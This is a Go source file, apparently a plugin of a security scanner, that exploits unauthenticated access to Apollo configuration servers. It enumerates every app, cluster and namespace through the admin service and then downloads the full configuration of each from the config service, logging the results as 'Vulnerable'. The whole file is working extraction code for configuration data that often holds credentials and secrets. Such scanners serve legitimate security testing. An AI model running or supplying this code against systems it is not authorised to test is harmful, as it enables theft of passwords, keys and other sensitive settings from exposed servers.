package apollo

/**
    @author: yhy
    @since: 2023/8/10
    @desc: apollo 配置获取 https://landgrey.me/blog/20/
**/

import (
	"encoding/json"
	"fmt"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"time"
)

// Run adminService: 访问页面帆会apollo-adminService 的地址 , configService: spring Eureka 的界面地址
func Run(adminService string, configService string) {
	// 1. 获取所有应用的基本信息 appId
	apps := getApps(adminService)

	if apps == nil {
		return
	}

	for _, app := range apps {
		// 2. 获取 appId 相关的 clusters
		clusters := getClusters(adminService, app.AppId)
		// 3. 获取 namespace
		for _, cluster := range clusters {
			nameSpaces := getNameSpace(adminService, app.AppId, cluster.Name)
			// 4. 组合appId、cluster、namespaceName 获取配置
			for _, nameSpace := range nameSpaces {
				target, configs := getConf(configService, app.AppId, cluster.Name, nameSpace.NamespaceName)
				logging.Logger.Infof("Vulnerable: [%s] %s", target, configs)
				output.OutChannel <- output.VulMessage{
					DataType: "web_vul",
					Plugin:   "apollo",
					VulnData: output.VulnData{
						CreateTime: time.Now().Format("2006-01-02 15:04:05"),
						Target:     configService,
						Method:     "GET",
						Ip:         "",
						Param:      "",
						Request:    "",
						Response:   configs,
						Payload:    target,
					},
					Level: output.Medium,
				}
			}
		}

	}
}

type Apps struct {
	Id      int    `json:"id"`
	Name    string `json:"name"`
	AppId   string `json:"appId"`
	OrgId   string `json:"orgId"`
	OrgName string `json:"orgName"`
}

func getApps(target string) []Apps {
	target = fmt.Sprintf("%s/apps", target)

	response, err := httpx.Get(target, "Apollo")
	if err != nil {
		logging.Logger.Errorln(err)
		return nil
	}

	var apps []Apps

	err = json.Unmarshal([]byte(response.Body), &apps)
	if err != nil {
		logging.Logger.Errorln(err)
		return nil
	}

	return apps
}

type Clusters struct {
	Id    int    `json:"id"`
	Name  string `json:"name"`
	AppId string `json:"appId"`
}

func getClusters(target string, appId string) []Clusters {
	target = fmt.Sprintf("%s/apps/%s/clusters", target, appId)

	response, err := httpx.Get(target, "Apollo")
	if err != nil {
		logging.Logger.Errorln(err)
		return nil
	}

	var clusters []Clusters

	err = json.Unmarshal([]byte(response.Body), &clusters)
	if err != nil {
		logging.Logger.Errorln(err)
		return nil
	}

	return clusters
}

type NameSpaces struct {
	Id            int    `json:"id"`
	AppId         string `json:"appId"`
	NamespaceName string `json:"namespaceName"`
}

func getNameSpace(target string, appId string, cluster string) []NameSpaces {
	target = fmt.Sprintf("%s/apps/%s/clusters/%s/namespaces", target, appId, cluster)

	response, err := httpx.Get(target, "Apollo")
	if err != nil {
		logging.Logger.Errorln(err)
		return nil
	}

	var nameSpaces []NameSpaces

	err = json.Unmarshal([]byte(response.Body), &nameSpaces)
	if err != nil {
		logging.Logger.Errorln(err)
		return nil
	}

	return nameSpaces
}

type Configs struct {
	AppId          string `json:"appId"`
	Cluster        string `json:"cluster"`
	NamespaceName  string `json:"namespaceName"`
	Configurations string `json:"configurations"`
	ReleaseKey     string `json:"releaseKey"`
}

func getConf(target string, appId string, cluster string, nameSpaces string) (string, string) {
	target = fmt.Sprintf("%s/configs/%s/%s/%s", target, appId, cluster, nameSpaces)

	response, err := httpx.Get(target, "Apollo")
	if err != nil {
		logging.Logger.Errorln(err)
		return "", ""
	}

	return target, response.Body
}
